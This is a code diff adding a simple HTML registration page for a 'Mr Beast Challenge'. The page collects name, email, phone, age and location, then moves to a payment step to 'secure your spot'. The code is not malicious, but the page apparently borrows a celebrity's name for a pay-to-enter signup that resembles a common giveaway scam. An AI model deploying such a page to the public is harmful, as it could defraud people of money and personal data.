@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mr Beast Challenge Registration</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #ff4c4c, #ff9900);
+      color: #fff;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background-color: rgba(0,0,0,0.7);
+      padding: 30px;
+      border-radius: 15px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    h1 {
+      margin-bottom: 20px;
+      font-size: 28px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+    }
+    button {
+      background-color: #00ff99;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #00cc77;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container" id="registrationForm">
+  <h1>Join the Mr Beast Challenge!</h1>
+  <form id="form">
+    <input type="text" name="name" placeholder="Full Name" required>
+    <input type="email" name="email" placeholder="Email Address" required>
+    <input type="tel" name="phone" placeholder="Phone Number" required>
+    <input type="number" name="age" placeholder="Age" required>
+    <input type="text" name="residence" placeholder="City / Country" required>
+    <button type="submit">Register Now 🚀</button>
+  </form>
+</div>
+
+<div class="container hidden" id="confirmation">
+  <h1>Registration Successful! 🎉</h1>
+  <p>Thanks for registering, <span id="userName"></span>!</p>
+  <button id="goToPayment">Next: Payment 💳</button>
+</div>
+
+<div class="container hidden" id="payment">
+  <h1>Secure Your Spot!</h1>
+  <p>Complete your payment to confirm your participation.</p>
+  <!-- Payment placeholder: plug in Stripe, Paystack, or PayPal here -->
+  <button>Pay Now 💰</button>
+</div>
+
+<script>
+  const form = document.getElementById('form');
+  const registrationForm = document.getElementById('registrationForm');
+  const confirmation = document.getElementById('confirmation');
+  const payment = document.getElementById('payment');
+  const userNameSpan = document.getElementById('userName');
+  const goToPaymentBtn = document.getElementById('goToPayment');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const formData = new FormData(form);
+    const name = formData.get('name');
+    userNameSpan.textContent = name;
+    registrationForm.classList.add('hidden');
+    confirmation.classList.remove('hidden');
+    // Here you can also send form data to your email via Formspree or backend
+  });
+
+  goToPaymentBtn.addEventListener('click', function() {
+    confirmation.classList.add('hidden');
+    payment.classList.remove('hidden');
+  });
+</script>
+
+</body>
+</html>
